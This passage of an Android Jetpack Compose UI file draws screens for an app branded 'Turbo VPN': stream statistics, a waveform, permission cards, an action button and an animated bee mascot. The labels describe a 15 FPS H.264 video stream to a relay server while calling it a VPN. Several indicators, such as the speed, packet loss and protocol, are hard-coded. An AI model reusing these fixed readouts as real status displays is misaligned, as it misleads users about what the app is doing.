                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Column {
                    Text(
                        text = "TOTAL DATA TRANSMITTED",
                        fontSize = 11.sp,
                        fontWeight = FontWeight.SemiBold,
                        color = ColorTextMuted
                    )
                    Row(
                        verticalAlignment = Alignment.Bottom,
                        horizontalArrangement = Arrangement.spacedBy(6.dp)
                    ) {
                        Text(
                            text = dataVal,
                            fontSize = 38.sp,
                            fontWeight = FontWeight.Black,
                            color = ColorHoneyYellow,
                            fontFamily = FontFamily.Monospace
                        )
                        Text(
                            text = dataUnit,
                            fontSize = 18.sp,
                            fontWeight = FontWeight.Black,
                            color = ColorCyberCyan,
                            modifier = Modifier.padding(bottom = 6.dp)
                        )
                    }
                }

                // Cyber Speed Meter Tag
                Box(
                    modifier = Modifier
                        .clip(RoundedCornerShape(12.dp))
                        .background(ColorCardInner)
                        .border(1.dp, Color(0xFF263C66), RoundedCornerShape(12.dp))
                        .padding(horizontal = 12.dp, vertical = 8.dp)
                ) {
                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        Text(
                            text = if (isStreaming) "STREAMING" else "IDLE",
                            fontSize = 9.sp,
                            fontWeight = FontWeight.Bold,
                            color = if (isStreaming) ColorEmerald else ColorTextMuted
                        )
                        Text(
                            text = if (isStreaming) "1.0 MB/s" else "0.0 KB/s",
                            fontSize = 13.sp,
                            fontWeight = FontWeight.Black,
                            color = ColorTextWhite
                        )
                    }
                }
            }

            // Live Oscilloscope Waveform Canvas
            LiveWaveformCanvas(
                isStreaming = isStreaming,
                modifier = Modifier
                    .fillMaxWidth()
                    .height(54.dp)
                    .clip(RoundedCornerShape(12.dp))
                    .background(ColorCardInner)
            )

            // Stream stats row
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                MetricItem(label = "RELAY PROTOCOL", value = "Secure WSS")
                MetricItem(label = "SERVER LINK", value = if (isConnected) "Connected" else "Standby")
                MetricItem(label = "PACKET LOSS", value = "0.0%")
            }
        }
    }
}

@Composable
fun LiveWaveformCanvas(
    isStreaming: Boolean,
    modifier: Modifier = Modifier
) {
    val infiniteTransition = rememberInfiniteTransition(label = "wave_anim")
    val phase by infiniteTransition.animateFloat(
        initialValue = 0f,
        targetValue = 2f * PI.toFloat(),
        animationSpec = infiniteRepeatable(
            animation = tween(if (isStreaming) 750 else 2400, easing = LinearEasing),
            repeatMode = RepeatMode.Restart
        ),
        label = "phase"
    )

    Canvas(modifier = modifier) {
        val width = size.width
        val height = size.height
        val midY = height / 2f

        // Draw center baseline grid
        drawLine(
            color = Color(0xFF1B2B4A),
            start = Offset(0f, midY),
            end = Offset(width, midY),
            strokeWidth = 1.dp.toPx()
        )

        val path = Path()
        val amplitude = if (isStreaming) height * 0.38f else height * 0.12f
        val frequency = if (isStreaming) 3.5f else 1.8f

        for (x in 0..width.toInt() step 4) {
            val progress = x.toFloat() / width
            val angle = progress * frequency * 2f * PI.toFloat() + phase
            val harmonic = if (isStreaming) (sin(angle * 2.2f) * amplitude * 0.35f) else 0f
            val y = midY + (sin(angle) * amplitude) + harmonic

            if (x == 0) {
                path.moveTo(x.toFloat(), y)
            } else {
                path.lineTo(x.toFloat(), y)
            }
        }

        // Glow layer when active
        if (isStreaming) {
            drawPath(
                path = path,
                color = Color(0x40FFC807),
                style = Stroke(width = 6.dp.toPx(), cap = StrokeCap.Round)
            )
        }

        // Front neon wave
        drawPath(
            path = path,
            brush = Brush.horizontalGradient(
                listOf(
                    ColorCyberCyan,
                    ColorHoneyYellow,
                    ColorHoneyGold,
                    ColorCyberCyan
                )
            ),
            style = Stroke(width = 2.5.dp.toPx(), cap = StrokeCap.Round)
        )
    }
}

@Composable
fun StreamPresetDetailsCard() {
    Card(
        colors = CardDefaults.cardColors(containerColor = ColorCardBg),
        shape = RoundedCornerShape(16.dp),
        border = BorderStroke(1.dp, ColorCardBorder),
        modifier = Modifier.fillMaxWidth()
    ) {
        Column(modifier = Modifier.padding(14.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
            Text(
                text = "TUNNEL SPECIFICATION PRESET",
                fontWeight = FontWeight.Bold,
                color = ColorTextMuted,
                fontSize = 11.sp,
                letterSpacing = 1.sp
            )
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                MetricItem(label = "RESOLUTION", value = "540p Scaled")
                MetricItem(label = "FIXED FPS", value = "15 FPS")
                MetricItem(label = "CBR BITRATE", value = "1.0 Mbps")
            }
        }
    }
}

@Composable
fun CameraPermissionCard(onGrantPermission: () -> Unit) {
    Card(
        colors = CardDefaults.cardColors(containerColor = ColorCardBg),
        shape = RoundedCornerShape(16.dp),
        border = BorderStroke(1.5.dp, Color(0x66FFC807)),
        modifier = Modifier.fillMaxWidth()
    ) {
        Column(
            modifier = Modifier.padding(16.dp),
            verticalArrangement = Arrangement.spacedBy(10.dp)
        ) {
            Row(
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                Text("📷", fontSize = 18.sp)
                Text(
                    text = "QR CODE SCAN PERMISSION",
                    fontWeight = FontWeight.Bold,
                    color = ColorHoneyYellow,
                    fontSize = 13.sp
                )
            }
            Text(
                text = "Grant Camera Permission to scan the pairing QR code for instant VPN tunneling.",
                color = ColorTextWhite,
                fontSize = 12.sp
            )
            Button(
                onClick = onGrantPermission,
                colors = ButtonDefaults.buttonColors(containerColor = ColorHoneyYellow),
                shape = RoundedCornerShape(10.dp),
                modifier = Modifier.fillMaxWidth()
            ) {
                Text(
                    text = "ALLOW CAMERA PERMISSION",
                    fontWeight = FontWeight.Black,
                    color = ColorBgDark,
                    fontSize = 13.sp
                )
            }
        }
    }
}

@Composable
fun BatteryOptimizationCard(onDisable: () -> Unit) {
    Card(
        colors = CardDefaults.cardColors(containerColor = Color(0xFF1E170A)),
        shape = RoundedCornerShape(14.dp),
        border = BorderStroke(1.dp, ColorHoneyGold),
        modifier = Modifier.fillMaxWidth()
    ) {
        Column(modifier = Modifier.padding(14.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
            Row(
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.spacedBy(6.dp)
            ) {
                Text("⚠️", fontSize = 16.sp)
                Text(
                    text = "Battery Optimization Active",
                    color = ColorHoneyYellow,
                    fontWeight = FontWeight.Bold,
                    fontSize = 13.sp
                )
            }
            Text(
                text = "Android may terminate continuous background VPN IP changing unless battery optimization is disabled.",
                color = ColorHoneyLight,
                fontSize = 12.sp
            )
            Button(
                onClick = onDisable,
                colors = ButtonDefaults.buttonColors(containerColor = ColorHoneyGold),
                shape = RoundedCornerShape(8.dp),
                modifier = Modifier.align(Alignment.End)
            ) {
                Text("Disable Optimization", color = ColorBgDark, fontSize = 12.sp, fontWeight = FontWeight.Bold)
            }
        }
    }
}

// ==========================================
// TURBO VPN MASTER ACTION BUTTON
// ==========================================

@Composable
fun TurboVpnActionButton(
    isServiceActive: Boolean,
    isStreaming: Boolean,
    isPaused: Boolean,
    onClick: () -> Unit,
    modifier: Modifier = Modifier
) {
    val infiniteTransition = rememberInfiniteTransition(label = "action_btn")

    val pulseScale by infiniteTransition.animateFloat(
        initialValue = 0.98f,
        targetValue = 1.05f,
        animationSpec = infiniteRepeatable(
            animation = tween(if (isStreaming) 700 else 1400, easing = FastOutSlowInEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "btn_pulse"
    )
    val buttonBrush = when {
        isStreaming -> Brush.horizontalGradient(listOf(Color(0xFFDC2626), Color(0xFFEF4444), Color(0xFFB91C1C)))
        isPaused -> Brush.horizontalGradient(listOf(Color(0xFFD97706), Color(0xFFF59E0B), Color(0xFFB45309)))
        isServiceActive -> Brush.horizontalGradient(listOf(Color(0xFF2563EB), Color(0xFF38BDF8), Color(0xFF1D4ED8)))
        else -> Brush.horizontalGradient(listOf(Color(0xFFFFC807), Color(0xFFF59E0B), Color(0xFFFFA500)))
    }

    val actionTitle = when {
        isStreaming -> "TURBO VPN ACTIVE"
        isPaused -> "VPN PAUSED (SCREEN LOCKED)"
        isServiceActive -> "CONNECTING TURBO VPN..."
        else -> "sTART"
    }

    val actionSubtitle = when {
        isStreaming -> "HARDWARE 15 FPS TUNNEL RUNNING • TAP TO STOP"
        isPaused -> "STANDBY FOR UNLOCK • TAP TO RESUME"
        isServiceActive -> "CONNECTING TO RELAY SERVER..."
        else -> "ENGAGE HARDWARE H.264 IP TUNNEL"
    }

    Box(
        modifier = modifier
            .fillMaxWidth()
            .height(82.dp)
            .scale(if (isStreaming) pulseScale else 1f),
        contentAlignment = Alignment.Center
    ) {
        // Outer animated rotating cyber dashed border
        if(isStreaming){
        Canvas(modifier = Modifier.fillMaxSize()) {
            val strokeWidth = 2.dp.toPx()
            val dashLength = 16.dp.toPx()
            val gapLength = 8.dp.toPx() 
                drawRoundRect(
                    brush = Brush.sweepGradient(
                        listOf(
                            ColorHoneyYellow,
                            ColorCyberCyan,
                            ColorElectricBlue,
                            ColorHoneyYellow
                        )
                    ),
                    topLeft = Offset(2.dp.toPx(), 2.dp.toPx()),
                    size = Size(size.width - 4.dp.toPx(), size.height - 4.dp.toPx()),
                    cornerRadius = androidx.compose.ui.geometry.CornerRadius(20.dp.toPx(), 20.dp.toPx()),
                    style = Stroke(
                        width = strokeWidth,
                        pathEffect = PathEffect.dashPathEffect(floatArrayOf(dashLength, gapLength), 0f)
                    )
                )
        }
    } 
        Button(
            onClick = onClick,
            modifier = Modifier
                .fillMaxSize()
                .padding(4.dp),
            shape = RoundedCornerShape(18.dp),
            colors = ButtonDefaults.buttonColors(containerColor = Color.Transparent),
            contentPadding = PaddingValues(0.dp)
        ) {
            Box(
                modifier = Modifier
                    .fillMaxSize()
                    .background(buttonBrush)
                    .padding(horizontal = 16.dp),
                contentAlignment = Alignment.Center
            ) {
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.Center,
                    modifier = Modifier.fillMaxWidth()
                ) {
                    // Action Icon
                    Box(
                        modifier = Modifier
                            .size(42.dp)
                            .clip(CircleShape)
                            .background(Color(0x33000000)),
                        contentAlignment = Alignment.Center
                    ) {
                        Text(
                            text = "⚡",
                            fontSize = 20.sp,
                            color = if (isStreaming) Color.White else ColorBgDark
                        )
                    }

                    Spacer(modifier = Modifier.width(14.dp))

                    Column(horizontalAlignment = Alignment.Start) {
                        Text(
                            text = actionTitle,
                            fontWeight = FontWeight.Black,
                            fontSize = 17.sp,
                            color = if (isStreaming || isServiceActive) Color.White else ColorBgDark,
                            letterSpacing = 0.5.sp
                        )
                        Text(
                            text = actionSubtitle,
                            fontWeight = FontWeight.Bold,
                            fontSize = 10.sp,
                            color = if (isStreaming || isServiceActive) Color(0xFFFDE68A) else Color(0xFF1E293B)
                        )
                    }
                }
            }
        }
    }
}

// ==========================================
// CUTE HONEYMO BEE MASCOT ILLUSTRATION
// ==========================================

@Composable
fun HoneyMoBeeMascot(
    isStreaming: Boolean,
    modifier: Modifier = Modifier
) {
    val infiniteTransition = rememberInfiniteTransition(label = "mascot_anim")

    // Wing flapping animation
    val wingFlap by infiniteTransition.animateFloat(
        initialValue = -24f,
        targetValue = 28f,
        animationSpec = infiniteRepeatable(
            animation = tween(if (isStreaming) 70 else 150, easing = FastOutSlowInEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "wing_flap"
    )

    // Gentle hovering bobbing
    val hoverY by infiniteTransition.animateFloat(
        initialValue = -3f,
        targetValue = 3f,
        animationSpec = infiniteRepeatable(
            animation = tween(1300, easing = FastOutSlowInEasing),
            repeatMode = RepeatMode.Reverse
        ),
        label = "hover_y"
    )

    // Eye blinking animation
    val eyeBlink by infiniteTransition.animateFloat(
        initialValue = 1f,
        targetValue = 0.1f,
        animationSpec = infiniteRepeatable(
            animation = keyframes {
                durationMillis = 3200
                1f at 0
                1f at 2900
                0.15f at 3050
                1f at 3200
            }
        ),
        label = "eye_blink"
    )

    Canvas(modifier = modifier) {
        val w = size.width
        val h = size.height
        val center = Offset(w * 0.48f, h * 0.52f + hoverY * density)

        // 1. Honey Glow Halo Behind
        drawCircle(
            brush = Brush.radialGradient(
                colors = listOf(
                    if (isStreaming) Color(0x66FFC807) else Color(0x33FFC807),
                    Color(0x00FFC807)
                ),
                center = center,
                radius = w * 0.52f
            )
        )

        // 2. Wings (Flapping behind the bee)
        val wingLeftPivot = Offset(center.x - w * 0.08f, center.y - h * 0.14f)
        val wingRightPivot = Offset(center.x + w * 0.08f, center.y - h * 0.14f)

        // Back Left Wing
        rotate(degrees = -18f + wingFlap, pivot = wingLeftPivot) {
            val wingPath = Path().apply {
                moveTo(wingLeftPivot.x, wingLeftPivot.y)
                cubicTo(
                    wingLeftPivot.x - w * 0.35f, wingLeftPivot.y - h * 0.42f,
                    wingLeftPivot.x - w * 0.12f, wingLeftPivot.y - h * 0.52f,
                    wingLeftPivot.x + w * 0.05f, wingLeftPivot.y - h * 0.22f
                )
                close()
            }
            drawPath(
                path = wingPath,
                color = Color(0xD9E0F2FE)
            )
            drawPath(
                path = wingPath,
                color = Color(0x8038BDF8),
                style = Stroke(width = 1.5.dp.toPx())
            )
        }

        // Back Right Wing
        rotate(degrees = 18f - wingFlap, pivot = wingRightPivot) {
            val wingPath = Path().apply {
                moveTo(wingRightPivot.x, wingRightPivot.y)
                cubicTo(
                    wingRightPivot.x + w * 0.15f, wingRightPivot.y - h * 0.45f,
                    wingRightPivot.x + w * 0.38f, wingRightPivot.y - h * 0.35f,
                    wingRightPivot.x + w * 0.08f, wingRightPivot.y - h * 0.15f
                )
                close()
            }
            drawPath(
                path = wingPath,
                color = Color(0xD9E0F2FE)
            )
            drawPath(
                path = wingPath,
                color = Color(0x8038BDF8),
                style = Stroke(width = 1.5.dp.toPx())
            )
        }

        // 3. Bumblebee Striped Body
        val bodyCenter = Offset(center.x + w * 0.12f, center.y + h * 0.12f)
        val bodyR = w * 0.24f

        // Body base oval
        drawCircle(
            color = Color(0xFFFFA500),
            radius = bodyR,
            center = bodyCenter
        )

        // Dark Brown Stripes
        val stripePaint = Color(0xFF26190D)
        drawArc(
            color = stripePaint,
            startAngle = 30f,
            sweepAngle = 120f,
            useCenter = false,
            topLeft = Offset(bodyCenter.x - bodyR, bodyCenter.y - bodyR),
            size = Size(bodyR * 2f, bodyR * 2f),
            style = Stroke(width = 4.5.dp.toPx())
        )
        drawArc(
            color = stripePaint,
            startAngle = 200f,
            sweepAngle = 100f,
            useCenter = false,
            topLeft = Offset(bodyCenter.x - bodyR * 0.8f, bodyCenter.y - bodyR * 0.8f),
            size = Size(bodyR * 1.6f, bodyR * 1.6f),
            style = Stroke(width = 4.5.dp.toPx())
        )

        // 4. Bee Head
        val headCenter = Offset(center.x - w * 0.06f, center.y - h * 0.04f)
        val headR = w * 0.28f

        drawCircle(
            color = Color(0xFFFFB703),
            radius = headR,
            center = headCenter
        )

        // Antennae
        val ant1Start = Offset(headCenter.x - w * 0.12f, headCenter.y - headR * 0.8f)
        val ant1End = Offset(ant1Start.x - w * 0.12f, ant1Start.y - h * 0.18f)
        drawLine(
            color = Color(0xFF1E170A),
            start = ant1Start,
            end = ant1End,
            strokeWidth = 2.dp.toPx(),
            cap = StrokeCap.Round
        )
        drawCircle(color = Color(0xFF1E170A), radius = 2.5.dp.toPx(), center = ant1End)

        val ant2Start = Offset(headCenter.x + w * 0.04f, headCenter.y - headR * 0.9f)
        val ant2End = Offset(ant2Start.x + w * 0.1f, ant2Start.y - h * 0.18f)
        drawLine(
            color = Color(0xFF1E170A),
            start = ant2Start,
            end = ant2End,
            strokeWidth = 2.dp.toPx(),
            cap = StrokeCap.Round
        )
        drawCircle(color = Color(0xFF1E170A), radius = 2.5.dp.toPx(), center = ant2End)

        // 5. Big Cute Eyes with Blinking
        val eyeLeftCenter = Offset(headCenter.x - w * 0.12f, headCenter.y - h * 0.04f)
        val eyeRightCenter = Offset(headCenter.x + w * 0.08f, headCenter.y - h * 0.04f)
        val eyeRadiusX = w * 0.09f
        val eyeRadiusY = (w * 0.11f) * eyeBlink

        // Sclera
        drawOval(
            color = Color.White,
            topLeft = Offset(eyeLeftCenter.x - eyeRadiusX, eyeLeftCenter.y - eyeRadiusY),
            size = Size(eyeRadiusX * 2f, eyeRadiusY * 2f)
        )
        drawOval(
            color = Color.White,
            topLeft = Offset(eyeRightCenter.x - eyeRadiusX, eyeRightCenter.y - eyeRadiusY),
            size = Size(eyeRadiusX * 2f, eyeRadiusY * 2f)
        )

        // Iris
        val irisR = eyeRadiusX * 0.7f
        drawCircle(color = Color(0xFF45220C), radius = irisR * eyeBlink, center = eyeLeftCenter)
        drawCircle(color = Color(0xFF45220C), radius = irisR * eyeBlink, center = eyeRightCenter)

        // Sparkles
        if (eyeBlink > 0.4f) {
            drawCircle(color = Color.White, radius = 2.dp.toPx(), center = Offset(eyeLeftCenter.x - 2.dp.toPx(), eyeLeftCenter.y - 2.dp.toPx()))
            drawCircle(color = Color.White, radius = 2.dp.toPx(), center = Offset(eyeRightCenter.x - 2.dp.toPx(), eyeRightCenter.y - 2.dp.toPx()))
        }

        // Cheeks
        drawCircle(
            color = Color(0x66FF6384),
            radius = w * 0.06f,
            center = Offset(headCenter.x - w * 0.18f, headCenter.y + h * 0.08f)
        )
        drawCircle(
            color = Color(0x66FF6384),
            radius = w * 0.06f,
            center = Offset(headCenter.x + w * 0.14f, headCenter.y + h * 0.08f)
        )

        // Sweet Smile
        val mouthPath = Path().apply {
            moveTo(headCenter.x - w * 0.06f, headCenter.y + h * 0.08f)
            quadraticBezierTo(
                headCenter.x, headCenter.y + h * 0.16f,
                headCenter.x + w * 0.06f, headCenter.y + h * 0.08f
            )
        }
        drawPath(
            path = mouthPath,
            color = Color(0xFF331B0A),
            style = Stroke(width = 2.dp.toPx(), cap = StrokeCap.Round)
        )

        // 6. Golden Honey Jar
        val jarCenter = Offset(center.x - w * 0.04f, center.y + h * 0.28f)
        val jarW = w * 0.28f
        val jarH = h * 0.24f

        // Glass Pot Body
        drawRoundRect(
            color = Color(0xFFFFB703),
            topLeft = Offset(jarCenter.x - jarW / 2f, jarCenter.y - jarH / 2f),
            size = Size(jarW, jarH),
            cornerRadius = androidx.compose.ui.geometry.CornerRadius(6.dp.toPx(), 6.dp.toPx())
        )

        // Dripping honey rim
        drawRoundRect(
            color = ColorHoneyYellow,
            topLeft = Offset(jarCenter.x - jarW * 0.55f, jarCenter.y - jarH * 0.55f),
            size = Size(jarW * 1.1f, jarH * 0.35f),
            cornerRadius = androidx.compose.ui.geometry.CornerRadius(4.dp.toPx(), 4.dp.toPx())
        )

        // Honey drip droplet
        drawCircle(
            color = ColorHoneyYellow,
            radius = 3.dp.toPx(),
            center = Offset(jarCenter.x - jarW * 0.2f, jarCenter.y + jarH * 0.1f)
        )
    }
}

// ==========================================
// UTILITY & METRIC HELPERS
// ==========================================

@Composable
fun MetricItem(label: String, value: String) {
    Column {
        Text(
            text = label,
            fontSize = 10.sp,
            color = ColorTextMuted,
            fontWeight = FontWeight.Bold,
            letterSpacing = 0.5.sp
        )
        Spacer(modifier = Modifier.height(2.dp))
        Text(
            text = value,
            fontSize = 14.sp,
            fontWeight = FontWeight.Black,
            color = ColorTextWhite
        )
    }
}

private fun formatBytes(bytes: Long): Pair<String, String> {
    return when {
        bytes >= 1024L * 1024 * 1024 -> Pair(String.format(Locale.US, "%.2f", bytes / (1024.0 * 1024 * 1024)), "GB")
        bytes >= 1024L * 1024 -> Pair(String.format(Locale.US, "%.1f", bytes / (1024.0 * 1024)), "MB")
        bytes >= 1024L -> Pair(String.format(Locale.US, "%.1f", bytes / 1024.0), "KB")
        else -> Pair("$bytes", "B")
    }
}
